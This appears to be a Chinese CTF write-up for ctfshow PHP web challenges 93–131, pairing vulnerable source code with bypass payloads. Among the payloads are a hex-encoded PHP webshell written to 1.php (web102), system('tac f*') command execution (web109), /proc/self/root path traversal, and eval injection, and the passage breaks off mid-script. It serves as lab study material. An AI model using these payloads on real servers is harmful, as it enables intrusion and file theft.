<p>过滤了字母但是我们可以使用其他进制就是计算 0b?? : 二进制0??? : 八进制 0X?? : 16进制 payload ： ?num=010574</p>
</blockquote>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 16:32:58
# @link: https://ctfer.com

*/

include(&quot;flag.php&quot;);
highlight_file(__FILE__);
if(isset($_GET[&#x27;num&#x27;]))&#123;
    $num = $_GET[&#x27;num&#x27;];
    if($num==4476)&#123;
        die(&quot;no no no!&quot;);
    &#125;
    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;
        die(&quot;no no no!&quot;);
    &#125;
    if(intval($num,0)==4476)&#123;
        echo $flag;
    &#125;else&#123;
        echo intval($num,0);
    &#125;
&#125;</code></pre>
<p>这里和上一题相比就是多了个过滤字母，上一题的方法还是不影响</p>
<p><img src="https://z4a.net/images/2022/06/14/image1b459d5a53dc46da.png" alt="image1b459d5a53dc46da.png"></p>
<h1 id="web94">web94</h1>
<blockquote>
<p>在93的基础上过滤了开头为0的数字 这样的话就不能使用进制转换来进行操作 我们可以使用小数点来进行操作。这样通过intval()函数就可以变为int类型的4476 ?num=4476.0</p>
</blockquote>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 16:46:19
# @link: https://ctfer.com

*/

include(&quot;flag.php&quot;);
highlight_file(__FILE__);
if(isset($_GET[&#x27;num&#x27;]))&#123;
    $num = $_GET[&#x27;num&#x27;];
    if($num===&quot;4476&quot;)&#123;
        die(&quot;no no no!&quot;);
    &#125;
    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;
        die(&quot;no no no!&quot;);
    &#125;
    if(!strpos($num, &quot;0&quot;))&#123;
        die(&quot;no no no!&quot;);
    &#125;
    if(intval($num,0)===4476)&#123;
        echo $flag;
    &#125;
&#125;</code></pre>
<p>num第一个值不能是0，也就是说十六进制的不能再使用了，又需要满足4476，那么可以4476.0</p>
<h1 id="web95">web95</h1>
<blockquote>
<p>可以通过8进制绕过但是前面必须多加一个字节 ?num=+010574或者?num=%2b010574</p>
</blockquote>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 16:53:59
# @link: https://ctfer.com

*/

include(&quot;flag.php&quot;);
highlight_file(__FILE__);
if(isset($_GET[&#x27;num&#x27;]))&#123;
    $num = $_GET[&#x27;num&#x27;];
    if($num==4476)&#123;
        die(&quot;no no no!&quot;);
    &#125;
    if(preg_match(&quot;/[a-z]|\./i&quot;, $num))&#123;
        die(&quot;no no no!!&quot;);
    &#125;
    if(!strpos($num, &quot;0&quot;))&#123;
        die(&quot;no no no!!!&quot;);
    &#125;
    if(intval($num,0)===4476)&#123;
        echo $flag;
    &#125;
&#125;</code></pre>
<p>这个过滤了点，八进制绕过，但是前面要多加一个字节，至于为啥我也不知道，记住就完了</p>
<h1 id="web96">web96</h1>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 19:21:24
# @link: https://ctfer.com

*/


highlight_file(__FILE__);

if(isset($_GET[&#x27;u&#x27;]))&#123;
    if($_GET[&#x27;u&#x27;]==&#x27;flag.php&#x27;)&#123;    // 相当于过滤了flag.php
        die(&quot;no no no&quot;);
    &#125;else&#123;
        highlight_file($_GET[&#x27;u&#x27;]);
    &#125;


&#125;</code></pre>
<p>./代表当前目录下的文件</p>
<h1 id="web97">web97</h1>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 19:36:32
# @link: https://ctfer.com

*/

include(&quot;flag.php&quot;);
highlight_file(__FILE__);
if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123;
if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;])
if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))  // md5相等值不相等，老考点了，且是强类型
echo $flag;
else
print &#x27;Wrong.&#x27;;
&#125;
?&gt;</code></pre>
<p>强类型的话就用数组绕过</p>
<p>参考</p>
<p><a href="https://oceansec.blog.csdn.net/article/details/109856150?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2-109856150-blog-115377084.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2-109856150-blog-115377084.pc_relevant_default&amp;utm_relevant_index=5">CTF中的md5弱类型</a></p>
<h1 id="web98">web98</h1>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 21:39:27
# @link: https://ctfer.com

*/

include(&quot;flag.php&quot;);
$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;
$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;;
$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;;
highlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__);

?&gt;</code></pre>
<p>这个考察php语法</p>
<p>直接传get，post  HTTP_FLAG=flag就行，中间那都没执行</p>
<p>参考</p>
<p><a href="https://www.php.cn/php-notebook-172859.html">php函数的传值与传址(引用)详解-php手册-PHP中文网</a></p>
<p><a href="https://www.php.cn/php-weizijiaocheng-383293.html">php三元运算符与if的详解-php教程-PHP中文网</a></p>
<h1 id="web99">web99</h1>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 22:36:12
# @link: https://ctfer.com

*/

highlight_file(__FILE__);
$allow = array();  // 数组
for ($i=36; $i &lt; 0x36d; $i++) &#123; 
    array_push($allow, rand(1,$i));   // 随机数
&#125;
if(isset($_GET[&#x27;n&#x27;]) &amp;&amp; in_array($_GET[&#x27;n&#x27;], $allow))&#123;   // in_array() 函数搜索数组中是否存在指定的值。但是这里没有设置第三个参数，
    file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]);
&#125;

?&gt;</code></pre>
<p><a href="https://www.w3school.com.cn/php/func_array_in_array.asp">PHP in_array() 函数 (w3school.com.cn)</a></p>
<p>写入1.php文件一句话木马</p>
<p>这个我弄了很久，都没有写进去🐎</p>
<h1 id="web100">web100</h1>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-21 22:10:28
# @link: https://ctfer.com

*/

highlight_file(__FILE__);
include(&quot;ctfshow.php&quot;);
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET[&#x27;v1&#x27;];
$v2=$_GET[&#x27;v2&#x27;];
$v3=$_GET[&#x27;v3&#x27;];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0)&#123;
    if(!preg_match(&quot;/\;/&quot;, $v2))&#123;
        if(preg_match(&quot;/\;/&quot;, $v3))&#123;
            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);  // 最终执行这个就会输出flag
        &#125;
    &#125;
    
&#125;


?&gt;</code></pre>
<p>预期解是利用PHP中反射类ReflectionClass</p>
<h1 id="web101">web101</h1>
<p>就是上一题的预期</p>
<h1 id="web102">web102</h1>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: atao
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-23 20:59:43

*/


highlight_file(__FILE__);
$v1 = $_POST[&#x27;v1&#x27;];
$v2 = $_GET[&#x27;v2&#x27;];
$v3 = $_GET[&#x27;v3&#x27;];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4)&#123;
    $s = substr($v2,2);
    $str = call_user_func($v1,$s);
    echo $str;
    file_put_contents($v3,$str);
&#125;
else&#123;
    die(&#x27;hacker&#x27;);
&#125;
?&gt;</code></pre>
<blockquote>
<p><strong>is_numeric()</strong> 函数用于检测变量是否为数字或数字字符串。</p>
</blockquote>
<p>在php5下，is_numeric()可以识别十六进制</p>
<pre><code class="hljs plaintext">var_dump(is_numeric(&quot;0x55&quot;));  #php5的环境下返回true  php7返回false</code></pre>
<p>所以当处于php5环境下可以将马转成十六进制</p>
<pre><code class="hljs plaintext">GET:v2=0x3c3f706870206576616c28245f504f53545b315d293b3f3e&amp;v3=1.php  #&lt;?php eval($_POST[1]);?&gt;
POST:v1=hex2bin</code></pre>
<p>在php7环境下使用base64加密的shell</p>
<pre><code class="hljs plaintext">payload：
v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php  #&lt;?=`cat *`;
POST：v1=hex2bin</code></pre>
<h1 id="web103">web103</h1>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: atao
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-23 21:03:24

*/


highlight_file(__FILE__);
$v1 = $_POST[&#x27;v1&#x27;];
$v2 = $_GET[&#x27;v2&#x27;];
$v3 = $_GET[&#x27;v3&#x27;];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4)&#123;
    $s = substr($v2,2);
    $str = call_user_func($v1,$s);
    echo $str;
    if(!preg_match(&quot;/.*p.*h.*p.*/i&quot;,$str))&#123;
        file_put_contents($v3,$str);
    &#125;
    else&#123;
        die(&#x27;Sorry&#x27;);
    &#125;
&#125;
else&#123;
    die(&#x27;hacker&#x27;);
&#125;

?&gt;</code></pre>
<p>同上</p>
<h1 id="web104">web104</h1>
<pre><code class="hljs plaintext">&lt;?php
highlight_file(__FILE__);
include(&quot;flag.php&quot;);

if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;
    $v1 = $_POST[&#x27;v1&#x27;];
    $v2 = $_GET[&#x27;v2&#x27;];
    if(sha1($v1)==sha1($v2))&#123;  // 要求sha1密文相等
        echo $flag;
    &#125;
&#125;
?&gt;</code></pre>
<p>数组绕过</p>
<p>官方hint给了两个相等sha1的值</p>
<pre><code class="hljs plaintext">#payload
aaK1STfY
0e76658526655756207688271159624026011393
aaO8zKZF
0e89257456677279068558073954252716165668</code></pre>
<h1 id="web105">web105</h1>
<pre><code class="hljs plaintext">&lt;?php
highlight_file(__FILE__);
include(&#x27;flag.php&#x27;);
error_reporting(0);
$error=&#x27;你还想要flag嘛？&#x27;;
$suces=&#x27;既然你想要那给你吧！&#x27;;
foreach($_GET as $key =&gt; $value)&#123;
    if($key===&#x27;error&#x27;)&#123;
        die(&quot;what are you doing?!&quot;);
    &#125;
    $$key=$$value;
&#125;foreach($_POST as $key =&gt; $value)&#123;
    if($value===&#x27;flag&#x27;)&#123;
        die(&quot;what are you doing?!&quot;);
    &#125;
    $$key=$$value;
&#125;
if(!($_POST[&#x27;flag&#x27;]==$flag))&#123;
    die($error);
&#125;
echo &quot;your are good&quot;.$flag.&quot;\n&quot;;
die($suces);

?&gt;
你还想要flag嘛？     // 只要让error和success任意一个值等于flag就能输出</code></pre>
<p>变量覆盖</p>
<pre><code class="hljs plaintext">payload:

h=flag&amp;flag=h</code></pre>
<h1 id="web106">web106</h1>
<pre><code class="hljs plaintext">&lt;?php

highlight_file(__FILE__);
include(&quot;flag.php&quot;);

if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;
    $v1 = $_POST[&#x27;v1&#x27;];
    $v2 = $_GET[&#x27;v2&#x27;];
    if(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2)&#123; // sha1密文相等，原值不相等
        echo $flag;
    &#125;
&#125;
?&gt;</code></pre>
<p>web104这题官方给的hint就可以用了，当然数组绕过也是可以的</p>
<h1 id="web107">web107</h1>
<pre><code class="hljs plaintext">&lt;?php
highlight_file(__FILE__);
error_reporting(0);
include(&quot;flag.php&quot;);

if(isset($_POST[&#x27;v1&#x27;]))&#123;
    $v1 = $_POST[&#x27;v1&#x27;];
    $v3 = $_GET[&#x27;v3&#x27;];
       parse_str($v1,$v2);  // 传入的v1的值解析到变量v2
       if($v2[&#x27;flag&#x27;]==md5($v3))&#123;  // 判断
           echo $flag;
       &#125;

&#125;
?&gt;</code></pre>
<blockquote>
<p>parse_str() 函数把查询字符串解析到变量中。</p>
<p>**注释：**如果未设置 <em>array</em> 参数，则由该函数设置的变量将覆盖已存在的同名变量。</p>
<p>**注释：**php.ini 文件中的 magic_quotes_gpc 设置影响该函数的输出。如果已启用，那么在 parse_str() 解析之前，变量会被 addslashes() 转换。</p>
</blockquote>
<p>这里这个函数可以解析成多个变量，这就是解题的关键。</p>
<h1 id="web108">web108</h1>
<pre><code class="hljs plaintext">&lt;?php
highlight_file(__FILE__);
error_reporting(0);
include(&quot;flag.php&quot;);

if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#x27;c&#x27;])===FALSE)  &#123;
    die(&#x27;error&#x27;);

&#125;
//只有36d的人才能看到flag
if(intval(strrev($_GET[&#x27;c&#x27;]))==0x36d)&#123;
    echo $flag;
&#125;

?&gt;
error</code></pre>
<blockquote>
<p><code>ereg()</code>函数搜索由指定的字符串作为由模式指定的字符串，如果发现模式则返回<code>true</code>，否则返回<code>false</code>。搜索对于字母字符是区分大小写的。 ereg函数存在NULL截断漏洞，存在00截断</p>
</blockquote>
<p>相当于过滤了大小写字母</p>
<blockquote>
<p><strong>intval()</strong> 函数用于获取变量的整数值。</p>
</blockquote>
<blockquote>
<p>strrev()反转</p>
</blockquote>
<p>0x36d十进制是877</p>
<h1 id="web109">web109</h1>
<pre><code class="hljs plaintext">&lt;?php
highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;
    $v1 = $_GET[&#x27;v1&#x27;];
    $v2 = $_GET[&#x27;v2&#x27;];

    if(preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v1) &amp;&amp; preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v2))&#123;  // 都过滤了大小写字母
            eval(&quot;echo new $v1($v2());&quot;);
    &#125;

&#125;

?&gt;</code></pre>
<pre><code class="hljs plaintext">v1和v2至少要匹配到一个字母，且v1和v2 new后面有一个类不报错
任意找一个php的内置类使得其不报错
payload: v1=ReflectionClass&amp;v2=system(&#x27;tac f*&#x27;)</code></pre>
<h1 id="web110">web110</h1>
<pre><code class="hljs plaintext">&lt;?php
highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;
    $v1 = $_GET[&#x27;v1&#x27;];
    $v2 = $_GET[&#x27;v2&#x27;];

    if(preg_match(&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;, $v1))&#123;
            die(&quot;error v1&quot;);
    &#125;
    if(preg_match(&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;, $v2))&#123;
            die(&quot;error v2&quot;);
    &#125;
    eval(&quot;echo new $v1($v2());&quot;);
&#125;
?&gt;</code></pre>
<blockquote>
<pre><code class="hljs plaintext">getcwd()函数 获取当前工作目录
语法
getcwd();</code></pre>
</blockquote>
<p>php原生类，可遍历目录类<code>FilesystemIterator</code></p>
<pre><code class="hljs plaintext">?v1=FilesystemIterator&amp;v2=getcwd</code></pre>
<h1 id="web111">web111</h1>
<blockquote>
<p>变量覆盖</p>
</blockquote>
<pre><code class="hljs plaintext">&lt;?php
highlight_file(__FILE__);
error_reporting(0);
include(&quot;flag.php&quot;);

function getFlag(&amp;$v1,&amp;$v2)&#123;
    eval(&quot;$$v1 = &amp;$$v2;&quot;);
    var_dump($$v1);
&#125;


if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;
    $v1 = $_GET[&#x27;v1&#x27;];
    $v2 = $_GET[&#x27;v2&#x27;];

    if(preg_match(&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;, $v1))&#123;
            die(&quot;error v1&quot;);
    &#125;
    if(preg_match(&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;, $v2))&#123;
            die(&quot;error v2&quot;);
    &#125;
    
    if(preg_match(&#x27;/ctfshow/&#x27;, $v1))&#123;
            getFlag($v1,$v2);
    &#125;
&#125;

?&gt;</code></pre>
<blockquote>
<p><code>$GLOBALS</code> — 引用全局作用域中可用的全部变量<br>
一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</p>
</blockquote>
<h1 id="web112">web112</h1>
<pre><code class="hljs plaintext">&lt;?php
highlight_file(__FILE__);
error_reporting(0);
function filter($file)&#123;
    if(preg_match(&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;,$file))&#123;   // 过滤
        die(&quot;hacker!&quot;);
    &#125;else&#123;
        return $file;
    &#125;
&#125;
$file=$_GET[&#x27;file&#x27;];
if(! is_file($file))&#123;
    highlight_file(filter($file));
&#125;else&#123;
    echo &quot;hacker!&quot;;
&#125;</code></pre>
<p>不能让is_file检测出是文件，并且 highlight_file可以识别为文件。这时候可以利用php伪协议。</p>
<h1 id="web113">web113</h1>
<blockquote>
<p>函数绕过</p>
</blockquote>
<pre><code class="hljs plaintext">&lt;?php
highlight_file(__FILE__);
error_reporting(0);
function filter($file)&#123;
    if(preg_match(&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123;
        die(&#x27;hacker!&#x27;);
    &#125;else&#123;
        return $file;
    &#125;
&#125;
$file=$_GET[&#x27;file&#x27;];
if(! is_file($file))&#123;
    highlight_file(filter($file));
&#125;else&#123;
    echo &quot;hacker!&quot;;
&#125;</code></pre>
<blockquote>
<p>在linux中/proc/self/root是指向根目录的，也就是如果在命令行中输入ls /proc/self/root，其实显示的内容是根目录下的内容</p>
</blockquote>
<pre><code class="hljs plaintext">file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</code></pre>
<h1 id="web114">web114</h1>
<pre><code class="hljs plaintext">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
function filter($file)&#123;
    if(preg_match(&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123;
        die(&#x27;hacker!&#x27;);
    &#125;else&#123;
        return $file;
    &#125;
&#125;
$file=$_GET[&#x27;file&#x27;];
echo &quot;师傅们居然tql都是非预期 哼！&quot;;
if(! is_file($file))&#123;
    highlight_file(filter($file));
&#125;else&#123;
    echo &quot;hacker!&quot;;
&#125; 师傅们居然tql都是非预期 哼！</code></pre>
<p>伪协议直接读</p>
<h1 id="web115">web115</h1>
<pre><code class="hljs plaintext">&lt;?php
include(&#x27;flag.php&#x27;);
highlight_file(__FILE__);
error_reporting(0);
function filter($num)&#123;
    $num=str_replace(&quot;0x&quot;,&quot;1&quot;,$num);
    $num=str_replace(&quot;0&quot;,&quot;1&quot;,$num);
    $num=str_replace(&quot;.&quot;,&quot;1&quot;,$num);
    $num=str_replace(&quot;e&quot;,&quot;1&quot;,$num);
    $num=str_replace(&quot;+&quot;,&quot;1&quot;,$num);
    return $num;
&#125;
$num=$_GET[&#x27;num&#x27;];
if(is_numeric($num) and $num!==&#x27;36&#x27; and trim($num)!==&#x27;36&#x27; and filter($num)==&#x27;36&#x27;)&#123;
    if($num==&#x27;36&#x27;)&#123;
        echo $flag;
    &#125;else&#123;
        echo &quot;hacker!!&quot;;
    &#125;
&#125;else&#123;
    echo &quot;hacker!!!&quot;;
&#125; hacker!!!</code></pre>
<p>trim函数的绕过+is_numeric绕过</p>
<pre><code class="hljs plaintext">?num=%0c36</code></pre>
<blockquote>
<p>知识点补充</p>
<pre><code class="hljs plaintext">trim(string,charlist)
语法：

参数                  描述
string           必需。规定要检查的字符串。
charlist       可选。规定从字符串中删除哪些字符。如果省略该参数，则移除下列所有字符：

&quot;\0&quot;       - NULL
&quot;\t&quot;       - 制表符
&quot;\n&quot;       - 换行
&quot;\x0B&quot;     - 垂直制表符
&quot;\r&quot;       - 回车
&quot; &quot;        - 空格
</code></pre>
<p>trim+is_numeric之后留下的只有+ - . 和%0c，其中%0c是换页符</p>
</blockquote>
<h1 id="web123">web123</h1>
<blockquote>
<p>突破函数禁用</p>
</blockquote>
<pre><code class="hljs plaintext">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
include(&quot;flag.php&quot;);
$a=$_SERVER[&#x27;argv&#x27;];
$c=$_POST[&#x27;fun&#x27;];
if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;
    if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;, $c)&amp;&amp;$c&lt;=18)&#123;
         eval(&quot;$c&quot;.&quot;;&quot;);  
         if($fl0g===&quot;flag_give_me&quot;)&#123;
             echo $flag;
         &#125;
    &#125;
&#125;
?&gt;</code></pre>
<blockquote>
<p>在php中变量名只有数字字母下划线，被get或者post传入的变量名，如果含有空格、+、[则会被转化为_，所以按理来说我们构造不出CTF_SHOW.COM这个变量(因为含有.)，但php中有个特性就是如果传入[，它被转化为_之后，后面的字符就会被保留下来不会被替换</p>
</blockquote>
<pre><code class="hljs ,COM">所以传入?CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=echo%20$flag</code></pre>
<h1 id="web125">web125</h1>
<blockquote>
<p>php特性</p>
</blockquote>
<pre><code class="hljs plaintext">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
include(&quot;flag.php&quot;);
$a=$_SERVER[&#x27;argv&#x27;];
$c=$_POST[&#x27;fun&#x27;];
if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;
    if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;, $c)&amp;&amp;$c&lt;=16)&#123;
         eval(&quot;$c&quot;.&quot;;&quot;);
         if($fl0g===&quot;flag_give_me&quot;)&#123;
             echo $flag;
         &#125;
    &#125;
&#125;
?&gt;</code></pre>
<p>过滤了echo，flag</p>
<pre><code class="hljs plaintext">get： huang=flag.php
post: ?CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=highlight_file($_GET[huang])</code></pre>
<h1 id="web126">web126</h1>
<blockquote>
<p>php特性</p>
</blockquote>
<pre><code class="hljs plaintext">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
include(&quot;flag.php&quot;);
$a=$_SERVER[&#x27;argv&#x27;];
$c=$_POST[&#x27;fun&#x27;];
if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;
    if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;, $c) &amp;&amp; strlen($c)&lt;=16)&#123;
         eval(&quot;$c&quot;.&quot;;&quot;);  
         if($fl0g===&quot;flag_give_me&quot;)&#123;
             echo $flag;
         &#125;
    &#125;
&#125;</code></pre>
<p>限制了长度，g i f c o d</p>
<pre><code class="hljs plaintext">get: ?$fl0g=flag_give_me;
post: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=eval($a[0])</code></pre>
<h1 id="web127">web127</h1>
<pre><code class="hljs plaintext">&lt;?php
error_reporting(0);
include(&quot;flag.php&quot;);
highlight_file(__FILE__);
$ctf_show = md5($flag);
$url = $_SERVER[&#x27;QUERY_STRING&#x27;];


//特殊字符检测
function waf($url)&#123;
    if(preg_match(&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;, $url))&#123;
        return true;
    &#125;else&#123;
        return false;
    &#125;
&#125;

if(waf($url))&#123;
    die(&quot;嗯哼？&quot;);
&#125;else&#123;
    extract($_GET);
&#125;


if($ctf_show===&#x27;ilove36d&#x27;)&#123;
    echo $flag;
&#125;</code></pre>
<blockquote>
<p>extract() 函数从数组中将变量导入到当前的符号表，使用数组键名作为变量名，使用数组键值作为变量值</p>
</blockquote>
<h1 id="web128">web128</h1>
<blockquote>
<p>骚操作</p>
</blockquote>
<pre><code class="hljs plaintext">&lt;?php
error_reporting(0);
include(&quot;flag.php&quot;);
highlight_file(__FILE__);

$f1 = $_GET[&#x27;f1&#x27;];
$f2 = $_GET[&#x27;f2&#x27;];

if(check($f1))&#123;
    var_dump(call_user_func(call_user_func($f1,$f2)));
&#125;else&#123;
    echo &quot;嗯哼？&quot;;
&#125;

function check($str)&#123;
    return !preg_match(&#x27;/[0-9]|[a-z]/i&#x27;, $str);
&#125; NULL</code></pre>
<blockquote>
<p>f1不能有数字或者字母，然后call_user_func在102讲过，call_user_func() 函数用于调用方法或者变量，第一个参数是被调用的函数，第二个是调用的函数的参数。</p>
</blockquote>
<blockquote>
<p>get_defined_vars ( void ) : array 函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</p>
</blockquote>
<pre><code class="hljs plaintext">?f1=_&amp;f2=get_defined_vars
过程是
var_dump(call_user_func(call_user_func($f1,$f2)));
var_dump(call_user_func(call_user_func(_,&#x27;get_defined_vars&#x27;)));
var_dump(call_user_func(get_defined_vars));//输出数组</code></pre>
<h1 id="web129">web129</h1>
<pre><code class="hljs plaintext">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET[&#x27;f&#x27;]))&#123;
    $f = $_GET[&#x27;f&#x27;];
    if(stripos($f, &#x27;ctfshow&#x27;)&gt;0)&#123;
        echo readfile($f);
    &#125;
&#125;</code></pre>
<blockquote>
<p>stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。</p>
</blockquote>
<p>检测到ctfshow的时候必须是大于0的位置，然后就可以读文件</p>
<h1 id="web130">web130</h1>
<blockquote>
<p>very very very（省略25万个very）ctfshow</p>
</blockquote>
<pre><code class="hljs plaintext">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
include(&quot;flag.php&quot;);
if(isset($_POST[&#x27;f&#x27;]))&#123;
    $f = $_POST[&#x27;f&#x27;];

    if(preg_match(&#x27;/.+?ctfshow/is&#x27;, $f))&#123;
        die(&#x27;bye!&#x27;);
    &#125;
    if(stripos($f, &#x27;ctfshow&#x27;) === FALSE)&#123;
        die(&#x27;bye!!&#x27;);
    &#125;

    echo $flag;

&#125;</code></pre>
<p>只是过滤小写</p>
<h1 id="web131">web131</h1>
<pre><code class="hljs plaintext">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
include(&quot;flag.php&quot;);
if(isset($_POST[&#x27;f&#x27;]))&#123;
    $f = (String)$_POST[&#x27;f&#x27;];

    if(preg_match(&#x27;/.+?ctfshow/is&#x27;, $f))&#123;
        die(&#x27;bye!&#x27;);
    &#125;
    if(stripos($f,&#x27;36Dctfshow&#x27;) === FALSE)&#123;
        die(&#x27;bye!!&#x27;);
    &#125;

    echo $flag;

&#125;</code></pre>
<p>正则表达式进行匹配，回溯绕过安全机制</p>
<pre><code class="hljs plaintext">import requests

url=&#x27;http://3d994b30-c182-4f9d-9eb3-2cfff11100f2.challenge.ctf.show/&#x27;
data=&#123;
